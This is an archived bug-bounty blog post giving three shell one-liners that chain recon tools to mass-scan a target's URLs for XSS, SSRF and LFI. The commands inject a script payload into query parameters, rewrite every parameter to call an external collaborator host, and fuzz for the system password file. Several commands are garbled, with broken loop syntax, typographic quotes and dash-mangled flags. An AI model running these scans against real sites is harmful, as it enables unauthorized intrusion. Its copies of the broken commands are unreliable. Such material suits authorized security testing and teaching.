# find ssrf lfi xss using httpx waybackurls gf gau qsreplace 96c4794e404c

- **Source URL:** https://medium.com/@SatyamPathania/find-ssrf-lfi-xss-using-httpx-waybackurls-gf-gau-qsreplace-96c4794e404c?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240905142027/https://medium.com/@SatyamPathania/find-ssrf-lfi-xss-using-httpx-waybackurls-gf-gau-qsreplace-96c4794e404c?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7177 (id 7177)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Find SSRF , LFI , XSS using httpx , waybackurls , gf , gau , qsreplace

Hello hackers

Today will show u how you can find ssrf xss and lfi using [gf](https://web.archive.org/web/20240905142027/https://github.com/tomnomnom/gf) , [httpx](https://web.archive.org/web/20240905142027/https://github.com/projectdiscovery/httpx) , [waybackurls](https://web.archive.org/web/20240905142027/https://github.com/tomnomnom/waybackurls) , [qsreplace](https://web.archive.org/web/20240905142027/https://github.com/tomnomnom/qsreplace) , [gau](https://web.archive.org/web/20240905142027/https://github.com/lc/gau) tool .

This will help you in bug bounty because its advanced bug bounty tips.

# So let’s start

# XSS

*First let’s start find xss for these we will use these tools gf , httpx , waybackurls , qsreplace , and command is like this :*


*cat file.txt | gf xss | grep ‘source=’ | qsreplace ‘”>\<script>confirm(1)\</script>’ | while read host do ; do curl –silent –path-as-is –insecure “$host” | grep -qs “\<script>confirm(1)” && echo “$host 33\[0;31mVulnerablen”;done*

This command will find **XSS** in the target domain.

# SSRF

Now let’s see how we can find **ssrf** using these tools. Here is the command to find SSRF on Target URLs

`findomain -t example.com -q | httpx -silent -threads 1000 | gau | grep “=” | qsreplace` [http://YOUR.burpcollaborator.net](https://web.archive.org/web/20240905142027/http://your.burpcollaborator.net/)

Here it will Filter the possible parameter of **ssrf** and also will send the request to your collaborator.

# LFI

*Follow this command to find LFI :*


`findomain -t example.com -q | waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done`

# Thanks For Reading (:

# Any Questions Knock here [https://linktr.ee/satyampathania](https://web.archive.org/web/20240905142027/https://linktr.ee/satyampathania)

credit — — don & me
